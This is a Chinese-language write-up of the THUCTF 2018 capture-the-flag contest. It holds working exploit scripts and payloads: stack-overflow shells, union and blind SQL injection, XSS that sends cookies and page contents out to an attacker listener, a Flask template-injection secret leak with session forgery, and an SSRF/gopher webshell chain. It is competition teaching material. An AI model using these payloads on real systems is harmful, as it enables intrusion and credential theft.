# THUCTF 2018 Write Up
Team Bakabaka⑨

这次比赛感觉时间太长了，太累了 TwT；
另外关于 pwn1 和 Easy Reverse Revenge，我有两点想吐槽的，写在 write up 最后了

## pwn1

先 `checksec`：
```sh
$ checksec stackoverflow64_withleak
[*] '/tmp/stackoverflow64_withleak'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
题目名称和提示以及 `checksec` 都指明了这题应该是栈溢出

有问题的就是这个 `vul` 函数了

```
.text:000000000040072A
.text:000000000040072A ; Attributes: bp-based frame
.text:000000000040072A
.text:000000000040072A                 public vul
.text:000000000040072A vul             proc near               ; CODE XREF: main+1D↓p
.text:000000000040072A
.text:000000000040072A var_2000        = byte ptr -2000h
.text:000000000040072A
.text:000000000040072A ; __unwind {
.text:000000000040072A                 push    rbp
.text:000000000040072B                 mov     rbp, rsp
.text:000000000040072E                 sub     rsp, 2000h
.text:0000000000400735                 lea     rax, [rbp+var_2000]
.text:000000000040073C                 mov     rsi, rax
.text:000000000040073F                 mov     edi, offset aS  ; "%s"
.text:0000000000400744                 mov     eax, 0
.text:0000000000400749                 call    ___isoc99_scanf
.text:000000000040074E                 mov     rdi, rsp
.text:0000000000400751                 nop
.text:0000000000400752                 leave
.text:0000000000400753                 retn
.text:0000000000400753 ; } // starts at 40072A
.text:0000000000400753 vul             endp
```

通过栈溢出可以控制返回时的 `%rip`；注意到这个过程中 `%rsp`（也就是 `%rbp - 0x2000`）是指向用户输入的，他会传给 `%rdi`，即调用的第一个参数。因此我们让 `%rip` 飞到 `system()` 就行了，最终相当于执行了 `system(我们的输入)`

```Python
from pwn import *

# p = process('./stackoverflow64_withleak')
p = remote('pwn.thuctf2018.game.redbud.info', 20001)
e = ELF('./stackoverflow64_withleak')

s = '/bin/sh' + '\0' * 0x3000
s = s[:0x2008] + p64(e.symbols['system'])

# context.terminal = ['tmux', 'splitw', '-v']
# gdb.attach(proc.pidof(p)[0])

print(p.recv(timeout=1.))
p.writeline(s)
p.interactive()
```

然后就简单了

```sh
$ cd /home
$ ls
ctf_puck
$ cd ctf_puck
$ ls
flag
run.sh
stackoverflow64_withleak
$ cat flag
THUCTF{HahA_you_got_it_And_90od_Job!}
```


---

我要吐槽这题的 `doit()` 函数：

```C
int doit()
{
  return system("/bin/cat 'ok'");
}
```

看这个函数，我还以为 `flag` 就在服务器上的 `ok` 里，调用这个函数就行了

结果服务器上根本没有这个文件。另外本题中 `stderr` 也没传回来，我这边什么都没收到，根本不知道发生了什么。如果这个函数真的没什么卵用，那写成

```C
int doit()
{
  return system("/bin/echo hello world");
}
```

之类的会好些，不会误导别人 TwT

## pwn2

解法和 pwn1 是一样的，先 `checksec`
```sh
$ checksec stackoverflow64_withnoleak
[*] '/tmp/stackoverflow64_withnoleak'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
和 pwn1 一样的

有问题的还是 `vul`，汇编代码都和 pwn1 一样
```C
.text:00000000004006F2 ; Attributes: bp-based frame
.text:00000000004006F2
.text:00000000004006F2                 public vul
.text:00000000004006F2 vul             proc near               ; CODE XREF: main+13↓p
.text:00000000004006F2
.text:00000000004006F2 var_2000        = byte ptr -2000h
.text:00000000004006F2
.text:00000000004006F2 ; __unwind {
.text:00000000004006F2                 push    rbp
.text:00000000004006F3                 mov     rbp, rsp
.text:00000000004006F6                 sub     rsp, 2000h
.text:00000000004006FD                 lea     rax, [rbp+var_2000]
.text:0000000000400704                 mov     rsi, rax
.text:0000000000400707                 mov     edi, offset aS  ; "%s"
.text:000000000040070C                 mov     eax, 0
.text:0000000000400711                 call    ___isoc99_scanf
.text:0000000000400716                 mov     rdi, rsp
.text:0000000000400719                 nop
.text:000000000040071A                 leave
.text:000000000040071B                 retn
.text:000000000040071B ; } // starts at 4006F2
.text:000000000040071B vul             endp
.text:000000000040071B
```

因此 pwn 的代码也和上一题一样

```Python
from pwn import *

# p = process('./stackoverflow64_withnoleak')
p = remote('pwn.thuctf2018.game.redbud.info', 20002)
e = ELF('./stackoverflow64_withnoleak')

s = '/bin/sh' + '\0' * 0x3000
s = s[:0x2008] + p64(e.symbols['system'])

# context.terminal = ['tmux', 'splitw', '-v']
# gdb.attach(proc.pidof(p)[0])

print(p.recv(timeout=1.))
p.writeline(s)
p.interactive()
```

```sh
$ cat /home/ctf_puck/flag
THUCTF{EnjoY_your_GAme_and_pwn_FOR_life_1on9!}
```

## wdSimpleSQLv1-1

审计代码，发现有拼字符串

```Python
if cowid:
    sql = "select username, subject, blog, description from bigcows where username = '%s'" % cowid
    try:
        bigcow = self.db.query(sql)
    except Exception as e:
        # report error ...

    if len(bigcow) != 1:
        # report error ...

    try:
        description = base64.b64decode(bigcow[0]['description']).split('\n')
    except Exception as e:
        # report error ...

    self.render('bigcow.html', bigcow=bigcow[0], description=description)
```

注入

```mysql
abc' union select flag,333,244,5555 from flag#
```

即调用 SQL：

```mysql
select username, subject, blog, description from bigcows where username = 'abc' union
    select flag,333,244,5555 from flag#'
```
可得到 `flag`

也即访问

```URL
http://wdsimplesqlv1.thuctf2018.game.redbud.info:23334/bigcow?cowname=abc%27%20union%20select%20flag,333,244,5555%20from%20flag%23
```

## wdSimpleSQLv1-2

同理注入

```mysql
abc' union select @@secure_file_priv,333,244,5555#
```
可得到 `@@secure_file_priv` = `/var/lib/mysql-files/`

利用 `load_file()` 再次注入

```mysql
abc' union select load_file('/var/lib/mysql-files/flag'),333,244,5555#
```

可得到 `flag`

也即先后访问

```URL
http://wdsimplesqlv1.thuctf2018.game.redbud.info:23334/bigcow?cowname=abc%27%20union%20select%20@@secure_file_priv,333,244,5555%23

http://wdsimplesqlv1.thuctf2018.game.redbud.info:23334/bigcow?cowname=abc%27%20union%20select%20load_file('/var/lib/mysql-files/flag')),333,244,5555%23
```

## XSS1

打开题目，下面有个类似于 `substr(md5($code),0,4) =='81b6'` 的验证码，可以用下面的脚本搞定

```sh
seq 1000000 | xargs -P16  -I'{}' sh -c "echo {} \$(echo -n {} | tr -d '\n' | openssl md5)" | grep -e '= 81b6'
```

随便填一个内容，并填入上面脚本搜到的验证码，页面会提示 `THE ADMIN WILL CHECK IT SOON...` 所以猜测是个 XSS。使用下面的脚本攻击：

```html
<script>
var i=document.createElement("link");
i.setAttribute("rel","prefetch");
i.setAttribute("href","http://ip:port/?"+document.cookie);
document.head.appendChild(i);
</script>
```

并在本机监听此端口

```sh
nc -l port
```
即可得到回传的 cookie，`flag` 就在其中

## XSS2
他说 `flag` 在 `flag.php`，访问 `http://65.52.174.189:8082/flag.php` 返回 `only admin can see the flag!`，那应该就是用 XSS 让管理员访问这个 `flag.php`，并回传。使用

```html
<iframe id="test" src="http://65.52.174.189:8082/flag.php" onload="test()"></iframe>
<script>
function test(){
  parent.window["location"].href="http://ip:port/?"+escape(document.getElementById("test").contentWindow.document.documentElement.outerHTML )
}
</script>
```
并在本机监听此端口

```sh
nc -l port
```
即可得到回传的 `flag`

## Flask
访问

```URL
http://flask.thuctf2018.game.redbud.info:8000/welcome?msg={{2**10}}
```

发现 `2**10` 被计算了，因此是 flask 的注入。

题目说 `Only admin can get the flag!`，访问

```URL
http://flask.thuctf2018.game.redbud.info:8000/welcome?msg={{session}}
```
得到回答

```
<SecureCookieSession {'username': 'guest'}>
```

因此需要搞到 `secret_key` 给 `session {'username': 'admin'}` 签名

题目过滤了括号 `()` 等。研究了很久，发现这样可以搞到 `secret_key`

```URL
http://flask.thuctf2018.game.redbud.info:8000/welcome?msg={{url_for.__globals__.current_app.secret_key}}
```

得到 `secret_key` = `!955)aa1~2.7e2ad`

然后利用这个 `secret_key` 模拟 flask 给 `session` 签名

```Python
from flask.sessions import SecureCookieSessionInterface

key = "!955)aa1~2.7e2ad"

class App(object):  
    def __init__(self):
        self.secret_key = None

exploit = {'username': u'admin'}

app = App()  
app.secret_key = key

# Encode a sessionsn exactly how Flask would do it
si = SecureCookieSessionInterface()  
serializer = si.get_signing_serializer(app)  
session = serializer.dumps(exploit)

print("Change your session cookie to: ")  
print(session)

# Test it on ourselves
x = serializer.loads(session)
print(x)
```

拿这个 cookie 去访问

```sh
curl --silent --cookie "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.DoqrLA.w4dJudHOddDCmsaopoGwx-b5KJM" "http://flask.thuctf2018.game.redbud.info:8000/welcome?msg=A%20simple%20flask%20application_\{\{session\}\}" | grep THUCTF
```

即得到 `flag`

## wdSimpleSQLv4

此题漏洞在登录的时候没有对用户名 `username` 进行检查，因此可以二进制盲注，在后面 `and` 上一个假设条件（例如：某个字段是以某字符串开头的）。通过登录成功或失败，就能推测出假设条件的真伪，而进一步通过二分策略即可得到具体的结果。
此题先要获取 `information_schema.tables` 中记载的表，发现一张可疑的表 `PIsAukBsoucg`，然后在 `information_schema.columns` 中查找其所含的字段，发现有个可疑的字段 `wUpWAcapJIxP`，然后通过二进制盲注
```sql
... and select(wUpWAcapJIxP)from(PIsAukBsoucg)where(left(wUpWAcapJIxP,...)=binary'...')
```
就能获取 `flag`

```Python
import os
import math
import re

# express str using ()''abcde...z
def trans(s):
    def trans_i(value):
        value1 = value // 16
        vaule2 = value % 16

        ans = "binary(unhex(concat("
        ans += "length('" + "a"*value1 + "')" if value1 < 10 else "'" + chr(ord('a') + value1 - 10) +  "'"
        ans += ","
        ans += "length('" + "a"*vaule2 + "')" if vaule2 < 10 else "'" + chr(ord('a') + vaule2 - 10) +  "'"
        ans += ")))"
        return ans

    return "concat(" + ",".join([trans_i(ord(c)) for c in s]) + ")"

def exist_begin_with(s):
    s = trans(s)
    s = os.popen("curl 'http://wdsimplesqlv4.thuctf2018.game.redbud.info:34445/login' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://wdsimplesqlv4.thuctf2018.game.redbud.info:34445' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://wdsimplesqlv4.thuctf2018.game.redbud.info:34445/login' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6' -H 'Cookie: _xsrf=2|e4fbf083|ac751f9874875a6dfbd83dcbae638cd1|1537843349; token=\"2|1:0|10:1537843846|5:token|136:ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFhV1FpT2lJMU1rTmZWeUo5LnpvSEpIVkJsZ1VOZXdrWDE0RGozRTBwOHN6blZVbU1PX1VOcGRlTzhpdHc=|1b17779ddbf2464ad255f940e17233c1fa1f0935961f9eaab7b3450b1d48b256\"' --data " + 

        # tabel_name: bigcows, PIsAukBsoucg, users
        # "\"username=shyotest'and(not(''=(select(table_name)from(information_schema.tables)where(TABLE_SCHEMA)=(database())and(left(table_name,length(" + s + "))=" + s + "))))%23"

        # column_name: wUpWAcapJIxP
        #"\"username=shyotest'and(not(''=(select('a')from(information_schema.columns)where(TABLE_SCHEMA)=(database())and(table_name='PIsAukBsoucg')and(left(column_name,length(" + s + "))=" + s + "))))%23"
        
        # flag: select wUpWAcapJIxP from PIsAukBsoucg
        "\"username=shyotest'and(not(''=(select('a')from(PIsAukBsoucg)where(left(wUpWAcapJIxP,length(" + s + "))=" + s + "))))%23"
        
        + "&password=12345678&_xsrf=2%7Ce8d24e53%7Ca05ca14878aee4bdf7f1831ba24a3201%7C1537843349\" --compressed --silent | grep 'mdl-chip__text'").read()
    # print(len(s), s)
    return len(s) == 0 or re.search(r"Subquery returns more than 1 row", s)

def search(s):
    for i in list(range(ord('a'), ord('z') + 1)) + list(range(ord('A'), ord('Z') + 1)) + list(range(ord('0'), ord('9') + 1)) + [ord('_'), ord('{'), ord('}'), ord('@'), ord('.')]:
        if i == ord(' '): continue
        ss = s + chr(i)

        if exist_begin_with(ss):
            print(ss)
            search(ss)

search('')
```

## BabyWeb
出题人良心的把默认主页的 php 源代码打出来了，是个拿 `curl` 访问任意 url 并回传结果的。`curl` 支持的协议很多，例如
```
http://babyweb.thuctf2018.game.redbud.info:8016/?url=file:///etc/passwd
```
就能拿到 `/etc/passwd`。

观察 `robots.txt` 发现它点到了另一个文件 `webshe11111111.php`。看名字是个  webshell，把它用前面的 `curl` 打出来
```
http://babyweb.thuctf2018.game.redbud.info:8016/?url=file:///var/www/html/webshe11111111.php
```
发现只要 `$_SERVER['REMOTE_ADDR'] === 127.0.0.1` 且 `$_POST['admin'] === 'h1admin'` 就行了。
我们构造 `POST` 请求，转化为 `gopher` 协议，并用前面调用 `curl` 的 `php` 去在服务器上本地执行它

```Python
a = """POST /webshe11111111.php HTTP/1.1
Host: localhost:12345
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 34
Content-Type: application/x-www-form-urlencoded

admin=h1admin&hacker=system('ls');
"""
import urllib
tmp = urllib.quote(a)
new = tmp.replace("%0A","%0D%0A")
result = "gopher://127.0.0.1:80/_"+urllib.quote(new)
result = "http://babyweb.thuctf2018.game.redbud.info:8016/?url=" + result
print(result)
``` 

即访问

```URL
http://babyweb.thuctf2018.game.redbud.info:8016/?url=gopher://127.0.0.1:80/_POST%2520/webshe11111111.php%2520HTTP/1.1%250D%250AHost%253A%2520localhost%253A12345%250D%250AUser-Agent%253A%2520curl/7.47.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Length%253A%252034%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527ls%2527%2529%253B%250D%250A
```

得到 `fl11111aaaaaggggg.php`。再查看这个文件的内容

```URL
http://babyweb.thuctf2018.game.redbud.info:8016/?url=file:///var/www/html/fl11111aaaaaggggg.php
```

即得到 `flag`

## easy rsa
`n = 1606938044411740147595993131987762585049124570740766496467497` 太小了，可以用 `msieve` 等工具直接分解

```sh
$ ./msieve 1606938044411740147595993131987762585049124570740766496467497 -q

1606938044411740147595993131987762585049124570740766496467497
p31: 1267650600250483566087213332093
p31: 1267650600326473639245405017629
```

然后就好办了

```Python
def ext_euclid(a, b):
    if (b == 0):
        return 1, 0, a
    else:
        x, y, q = ext_euclid(b, a % b)
        x, y = y, (x - (a // b) * y)
        return x, y, q

p = 1267650600250483566087213332093
q = 1267650600326473639245405017629
cipher = 401533489858983095606309339787817217779019525090976475619112

d, _, gcd = ext_euclid(0x10001, (p - 1) * (q - 1))
assert gcd == 1

plaintext = pow(cipher, d, p * q)
plaintext = hex(plaintext)[2:-1]
plaintext = bytearray.fromhex(plaintext)

print(plaintext)
```

## polynomial
观察加密方式，发现其为仿射密码，只有两个参数，范围只有 $257^2$ 量级，可直接枚举：
```Python
data = 'ca6d1106cadeb7c164ac79dfac79df6e12df6ed5d5ac128ddffeaca2648d31df6efe08c16e8383278046'
data = bytearray.fromhex(data)
decode = lambda x: (x * p + q) % 257

for p in range(257):
    for q in range(257):
        if decode(data[0]) == ord('T') and decode(data[1]) == ord('H'):
            decode_data = [decode(x) for x in data]
            decode_data = [chr(x) for x in decode_data]
            decode_data = ''.join(decode_data)
            print(decode_data)
            break
```

## Primary Mathematics
大概是命题人没考虑到 $a = 1, b = -1, c = -1$

正解应该是椭圆曲线什么的，没时间实现了： https://zhuanlan.zhihu.com/p/33853851

## Easy Reverse
观察代码
```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  // ...
  v7 = __readfsqword(0x28u);
  printf("Input password:", a2, a3);
  __isoc99_scanf("%s", v5);
  if ( v6 != '}' )
    sub_92A();
  for ( i = 0; i <= 6; ++i )
  {
    if ( v5[i] != aThuctf[i] )
      sub_92A();
  }
  if ( (unsigned int)sub_7AA((__int64)&v5[7]) )
    puts("Good job!");
  else
    puts("Try again.");
  return 0LL;
}


// byte_201040 = A_1 = [0x62, 0x83, 0x71, ..., 0x1B, 0xDC, 0xCE]
// byte_201080 = b_1 = [0xEF, 0x55, 0xB9, 0x07, 0xDA, 0xA8, 0xF5, 0x98]
// byte_2010A0 = A_2 = [0x34, 0x6E, 0x80, ..., 0xAB, 0xF9, 0x4D]
// byte_2010E0 = b_2 = [0x19, 0x38, 0xA8, 0x89, 0x38, 0xFF, 0xD8, 0x9D]
// a1 points to the string inside 'THUCTF{}'
__int64 __fastcall sub_7AA(__int64 a1)
{
  // ...
  result = 0LL;
  for ( i = 0; i <= 7; ++i )
  {
    v6[i] = 0;
    for ( j = 0; j <= 7; ++j )
      v6[i] += *(_BYTE *)(j + a1) * byte_201040[8 * i + j];
    result = byte_201080[i];
    if ( v6[i] != (_BYTE)result )
      return 0LL;
  }
  for ( k = 0; k <= 7; ++k )
  {
    v6[k] = 0;
    for ( l = 0; l <= 7; ++l )
      
      v6[k] += *(_BYTE *)(l + 8LL + a1) * byte_2010A0[8 * k + l];
    result = byte_2010E0[k];
    if ( v6[k] != (_BYTE)result )
      return 0LL;
  }
  return result;
}
```

发现需要解两个线性同余方程组 $A_1 x_1 = b_1, A_2 x_2 = b_2$：

```Python
import numpy as np

def ext_euclid(a, b):
    if (b == 0):
        return 1, 0, a
    else:
        x, y, q = ext_euclid(b, a % b)
        x, y = y, (x - (a // b) * y)
        return x, y, q
ext_euclid = np.vectorize(ext_euclid)

def solve(n, A, b):
    A = np.array(A).reshape([n, n])
    b = np.array(b).reshape([n, 1])
    order = list(range(n + 1))
    A = np.hstack([A, b])
    A = np.vstack([A, order])
    assert A.shape == (n + 1, n + 1)

    for i in range(n):
        inv, _, gcd = ext_euclid(A[i:n, i:n], 256)
        assert np.all((A[i:n, i:n] * inv) % gcd == 0)

        p, q = np.unravel_index(np.argmin(gcd), gcd.shape)

        inv, gcd = inv[p, q], gcd[p, q]
        inv &= 0xFF

        A[[i, p + i], :] = A[[p + i, i], :]
        A[:, [i, q + i]] = A[:, [q + i, i]]

        assert np.all(A[i, :] % gcd == 0)
        assert ((inv * A[i, i]) & 0xFF) == gcd

        A[i, :] = ((A[i, :] / gcd) * inv) & 0xFF
        for j in range(i + 1, n):
            A[j, :] = (A[j, :] - A[j, i] * A[i, :]) & 0xFF

    for i in reversed(range(n)):
        for j in range(0, i):
            A[j, :] = (A[j, :] - A[j, i] * A[i, :]) & 0xFF

    order = A[-1, :n]
    ans = A[:n, -1]
    order = np.argsort(order)
    ans = ans[order]
    ans = ''.join([chr(x) for x in ans])
    print(ans)


n = 8
A = [0x62, 0x83, 0x71, ..., 0x1B, 0xDC, 0xCE]
b = [0xEF, 0x55, 0xB9, 0x07, 0xDA, 0xA8, 0xF5, 0x98]
solve(n, A, b)
A = [0x34, 0x6E, 0x80, ..., 0xAB, 0xF9, 0x4D]
b = [0x19, 0x38, 0xA8, 0x89, 0x38, 0xFF, 0xD8, 0x9D]
solve(n, A, b)
```

可得到解 $x_1, x_2$，即 `flag` = `THUCTF{ x_1 x_2 }`

## User Auth
提供的程序中已经给出了登录时密码的计算方式，以及获取信息的方式。
一种方法是将程序 patch 一下，把写死的登录用户名换成别的有权限的人就行了。
我还是选择直接把 `client` 重写：
```Python
from pwn import *
import random
import re

def get_pass(data, nonce, mutator = 1, rand = None):
    if rand is None: rand = random.randint(0, 3)
    left = mutator + rand % 3
    dest = nonce[left:]
    result = [((ord(dest[i]) ^ ord(data[i])) + 256 - i) & 0x7F for i in range(5)]
    return result


def make_printable(data):
    data = [x + 32 if x <= 31 else x for x in data]
    data = [x - 126 + 32 if x == 127 else x for x in data]
    return ''.join([chr(x) for x in data])

p = remote('202.112.51.234', 20000)

nonce = p.recvline()[15:30]
print(nonce)

print(p.recv(timeout=1.))
p.sendline('version 3.11.54');

while True:
    while True:
        print(p.recvline())
        username = 'iromise'
        p.sendline(username);
        
        print(p.recvline())
        password = get_pass(username, nonce)
        password = make_printable(password)
        p.sendline(password)
        
        s = p.recvline()
        print(s)
        if not re.search('wrong password', s):
            break

    p.sendline('list users');
    print(p.recv(timeout=3.))
    print(p.recv(timeout=3.))

    p.sendline('print key');
    challenge = p.recvline()[11:]
    print(challenge)

    print(p.recv(timeout=1.))
    password = get_pass(challenge, nonce, 7, 0)
    password = make_printable(password)
    p.sendline(password)
    
    s = p.recvline()
    print(s)
    if not re.search('you are not worthy', s):
        break

print(p.recv(timeout=1.))
```

每次有只有一定的概率能获得 `flag`，重复运行几次即可

## godaddy
此题一开始就开了个新进程，然后将子进程挂起，等待父进程操作：

```C
v7 = fork();
if ( v7 )
{
  sub_4009A0(v7);
}
else
{
  ptrace(0, 0LL, 0LL, 0LL);
  execve(*v9, &argv, environ);
}
```

父进程的操作是对子进程的关键部分解密，具体的：

* 先把加密部分 `0x400860 ~ 0x4009a0` dump 出来
  ```C
  __pid_t __fastcall sub_4009A0(__pid_t a1)
  {
    // ...
    pid = a1;
    v7 = (char *)sub_4009A0 - (char *)&loc_400860;
    waitpid(a1, &stat_loc, 2);
    v6 = (__int64 *)malloc(v7);
    v8 = v6;
    v9 = (__pid_t (__fastcall *)(__pid_t))&loc_400860;
    while ( (unsigned __int64)v9 < (unsigned __int64)sub_4009A0 )
    {
      *v8 = ptrace(PTRACE_PEEKDATA, (unsigned int)pid, v9, 0LL);
      v9 = (__pid_t (__fastcall *)(__pid_t))((char *)v9 + 8);
      ++v8;
    }
    // ...
  }
  ```
* 然后是个 AES-128
  ```C
  __pid_t __fastcall sub_4009A0(__pid_t a1)
  {
    // ...

    // unk_6030A0 = key = DADECCEF66BEEFDEADAABBCCFFEEDD00
    sub_400CA0((__int64)&v5, (__int64)&unk_6030A0);
    v4 = v6;
    for ( i = 0; i < v7; i += 16 )
    sub_4010D0((__int64)&v5, (__int64)&v4[i / 8u]);
    v8 = v6;

    // ...
  }
  ```
* 解密完了之后再把东西填回去，唤醒子进程让它继续跑，由子进程检查输入的 flag 是否合法
  ```C
  __pid_t __fastcall sub_4009A0(__pid_t a1)
  {
    // ...

    v8 = v6;
    v9 = (__pid_t (__fastcall *)(__pid_t))&loc_400860;
    while ( (unsigned __int64)v9 < (unsigned __int64)sub_4009A0 )
    {
      ptrace(PTRACE_POKEDATA, (unsigned int)pid, v9, *v8);
      v9 = (__pid_t (__fastcall *)(__pid_t))((char *)v9 + 8);
      ++v8;
    }
    ptrace(PTRACE_CONT, (unsigned int)pid, 0LL);

    // ...
  }
  ```

我们直接对二进制中相关的部分解密，
```sh
$ dd if=godaddy of=temp skip=0x860 count=0x140 bs=1
$ openssl aes-128-ecb -d -K DADECCEF66BEEFDEADAABBCCFFEEDD00 -in temp -out temp2
$ objdump -D -b binary -m i386:x86-64 -d temp2 | head -n20

temp2:     file format binary


Disassembly of section .data:

0000000000000000 <.data>:
   0:   55                      push   %rbp
   1:   48 89 e5                mov    %rsp,%rbp
   4:   48 83 ec 30             sub    $0x30,%rsp
   8:   48 89 7d f8             mov    %rdi,-0x8(%rbp)
   c:   48 8b 7d f8             mov    -0x8(%rbp),%rdi
  10:   e8 3b fe ff ff          callq  0xfffffffffffffe50
  15:   48 83 f8 1e             cmp    $0x1e,%rax
  19:   0f 84 19 00 00 00       je     0x38
  1f:   48 bf 84 26 40 00 00    movabs $0x402684,%rdi
  26:   00 00 00
  29:   b0 00                   mov    $0x0,%al
  2b:   e8 30 fe ff ff          callq  0xfffffffffffffe60
  30:   89 45 e4                mov    %eax,-0x1c(%rbp)
$ dd if=temp2 of=godaddy seek=0x860 count=0x140 bs=1 conv=notrunc
```
`objdump` 给出了正常的规整的指令流，解密应该算是成功了

然后，我们再用 ida 反编译之，就可得到关键部分：

```C
void __fastcall sub_400860(const char *a1)
{
  char v1; // si
  _BYTE *s1; // [rsp+18h] [rbp-18h]
  int i; // [rsp+24h] [rbp-Ch]

  if ( strlen(a1) == 30 )
  {
    s1 = malloc(0x1FuLL);
    for ( i = 0; (unsigned __int64)i < 0x1E; ++i )
    {
      if ( i % 2 )
        v1 = (i + a1[i] + 55) ^ 0xDD;
      else
        v1 = (i + a1[i] - 19) ^ 0xCC;
      s1[i] = v1;
    }
    // unk_603080 =
    //     8D 5D 88 A0 89 5F A2 5F  FA 59 F7 46 94 66 90 69
    //     BD 66 92 1E FD 1C AE 1F  F9 72 82 5F E6 0C
    if ( !memcmp(s1, &unk_603080, 0x1EuLL) )
      printf("You win! Submit what you input\n", &unk_603080);
    else
      printf("You losE!\n", &unk_603080);
    free(s1);
  }
  else
  {
    printf("You losE!\n");
  }
}
```

被加密部分是一个很容易求逆的过程，容易推出正确的程序输入：
```Python
data = [0x8D, 0x5D, 0x88, ..., 0x5F, 0xE6, 0x0C]

p = lambda x: chr(((x ^ 0xDD) - 55 - i) & 0xFF)
q = lambda x: chr(((x ^ 0xCC) + 19 - i) & 0xFF)
data = [p(x) if i % 2 else q(x) for i, x in enumerate(data)]
print(''.join(data))
```

即 `flag`

## Easy Reverse Revenge
反编译后，发现此题正确输入的格式为 `THUCTF{.{4}_.{5}_.*}`，即 (长度 4 的串 `_` 长度 5 的串 `_` 长度任意的串) 其中：

* `.{4}` 的 md5 为 `37D001E7355A67F66481F4579E27B8F5`
* `.{5}` 的 md5 为 `4B63B1FFE0F33F96467641B9F5A3D5C3`
* `.{4}_.{5}_.*` 的 md5 为 `A42D5D5BF6CD9C19570E4AD29B840DA7`

前两个可以通过 `cmd5.com` 找到，为

* md5(`vl0n`) = `37D001E7355A67F66481F4579E27B8F5` 
* md5(`cy5go`) = ` 4B63B1FFE0F33F96467641B9F5A3D5C3`

第三个相当于加了 salt 的 md5，比较麻烦

注意到验证完了之后，程序还解密了什么东西
```C
signed __int64 __fastcall sub_8E5(__int64 a1)
{
  //...
  puts("Good job!");

  // void *input points to the input string inside THUCTF{}, i.e. ".{4}_.{5}_.*"
  char p = *(_BYTE *)(input + 11); // 1st char in .*
  char q = *(_BYTE *)(input + 12); // 2nd char in .*
  for ( l = 0; l <= 1503; l += 2 )
  {
    // byte_202060 = [0xEC, 0x3D, 0x2B, 0x2A, ...]
    byte_202060[l] ^= p;
    byte_202060[l + 1] ^= q;
  }

  return 1LL;
}
```

是一个两路的 `xor` 解密。

如果假设数据服从特定的概率分布，通过枚举可知 `p ^ q = 0x8` 时，两路的数据分布最接近。

```Python
import matplotlib.pyplot as plt
import numpy as np

data = [0xEC, 0x3D, 0x2B, 0x2A, 0x68, 0x67, 0x7F, 0x67, 0x65, 0x6D, 0x65, 0x60, 0x2C, 0x25, 0x21, 0x3F,
# ...
0x20, 0x52, 0xF9, 0x36, 0x65, 0x6D, 0x65, 0x6D, 0x2C, 0x28, 0x2B, 0x29, 0xCB, 0x2F, 0x05, 0xEF]

for offset in range(256):
    print("offset = ", offset)
    data_0 = data[0::2]
    data_1 = [x ^ offset for x in data[1::2]]

    plt.subplot(211); plt.xlim(0,255); plt.hist(data_0, bins=256)
    plt.subplot(212); plt.xlim(0,255); plt.hist(data_1, bins=256)
    plt.show()
```

进一步枚举 $p, q$
```Python
for p in range(256):
    q = p ^ 0x08
    print("p", p, "q", q, [chr(data[0]^p) + chr(data[1]^q) + chr(data[2]^p) + chr(data[3]^q)])
```
知 `p = 0x65, q = 0x6d` 时，数据解密出了 PNG 头

进一步解压出此 PNG 文件
```Python
p, q = 0x65, 0x6d
data = [x ^ p if i % 2 == 0 else x ^ q for (i, x) in enumerate(data)]
with open('/tmp/123.png', 'wb') as f: f.write(bytes(data))
```
发现其内容正好就是第三部分的内容 `em!v*vr01l`，其中 `'e' = p = 0x65. 'm' = q = 0x6d`，且容易验证 `vl0n_cy5go_em!v*vr01l` 的 md5 满足条件

故`flag` 即 `THUCTF{vl0n_cy5go_em!v*vr01l}`

---

我要吐槽图片中这个字母 `l` 的字体像或符号 `|` 一样

## Pixels
解码后发现前两个 pixel 的通道值构成了 PNG 头 `[137  80  78  71]`:
```Python
import matplotlib.pyplot as plt
import numpy as np
import imageio

i = imageio.imread('thuctfpixel.png')
print(i.flat[:4])
```
因此此图应该是利用 PNG 的无损压缩特性，把另一张 PNG 图又无损地编码了一次。
再解压一次之后，即得到 `flag`
```Python
with open('/tmp/123.png', 'wb') as f: f.write(bytes(i))
```

## Ruby Master - Level 1
题目通过 `seccomp` 限制了不能读，因此读取源代码肯定是无效的了

事实上，再定义一个公有函数就行了

```Ruby
def p.x; flag; end; p.x
```

即执行

```sh
echo 'def p.x; flag; end; p.x' | nc misc.thuctf2018.game.redbud.info 4001
```

## Ruby Master - Level 2
反汇编

```Ruby
RubyVM::InstructionSequence.disasm(self.method(:get_flag))
```

即执行

```sh
echo 'RubyVM::InstructionSequence.disasm(self.method(:get_flag))' | nc misc.thuctf2018.game.redbud.info 4002
```

## Ruby Master - Level 3
使用 `ObjectSpace`

```Ruby
ObjectSpace.each_object(String){|o|puts o if /F{.{9,}}/=~o}
```

即执行

```sh
echo 'ObjectSpace.each_object(String){|o|puts o if /F{.{9,}}/=~o}' | nc misc.thuctf2018.game.redbud.info 4003
```

## RedbudToken1 - Welcome
我比较弱 TwT

我就看别人谁和 `0x29047AA8B731cd5474E06b6c1Ff8eF03191fCBb2` 有交易记录，比如在

```URL
https://ropsten.etherscan.io/tx/0x2850b61b64571ef0d4a99b384f29e341cf5307cf18beb16bdbcc137e184b3034
```

中有
`0x5151d68558dfe67f9448116bee00f3e33e281a3a` 给他汇款了，那么就以他的身份访问

```URL
http://40.83.100.81:9900/account/0x5151d68558dfe67f9448116bee00f3e33e281a3a
```

得到 `flag`，事实上当时还获得了第二个 `flag`，后来这个 bug 被修了（

## Format
先看题干给的东西
